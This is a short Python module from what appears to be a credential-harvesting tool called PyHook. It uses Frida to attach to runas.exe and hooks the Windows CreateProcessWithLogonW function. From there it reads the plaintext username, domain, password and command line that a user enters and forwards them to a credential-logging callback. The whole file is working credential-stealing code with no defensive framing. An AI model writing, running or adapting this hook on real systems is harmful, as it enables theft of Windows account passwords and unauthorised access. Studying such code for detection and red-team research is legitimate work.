from PyHook import wait_for_process, on_credential_submit, log
import frida


hook_process_name = "runas"


def logger(message):
    log(hook_process_name, message)


def wait_for():
    wait_for_process(["runas.exe"], hook)


def hook(pid):
    try:
        logger("Trying To Hook Into RunAs")
        session = frida.attach(pid)
        logger(f"Hooked RunAs With PID {pid}")
        script = session.create_script("""

		var CreateProcessWithLogonW = Module.findExportByName("Advapi32.dll", 'CreateProcessWithLogonW')

		Interceptor.attach(CreateProcessWithLogonW, {
			onEnter: function (args) {


				this.lpUsername = args[0];
				this.lpDomain = args[1];
				this.lpPassword = args[2];
				this.lpCommandLine = args[5];
			},
			onLeave: function (args) {
				send("\\n=============================" + "\\n[+] Intercepted Creds from RunAs" +"\\nUsername    : " + this.lpUsername.readUtf16String() + "\\nCommandline : " + this.lpCommandLine.readUtf16String() + "\\nDomain      : " + this.lpDomain.readUtf16String() + "\\nPassword    : " + this.lpPassword.readUtf16String()+ "\\n=============================");


			}
		});

		""")
        script.on('message', on_credential_submit)
        script.load()

    except Exception as e:
        logger("Unhandled exception: " + str(e))
        logger("Continuing...")

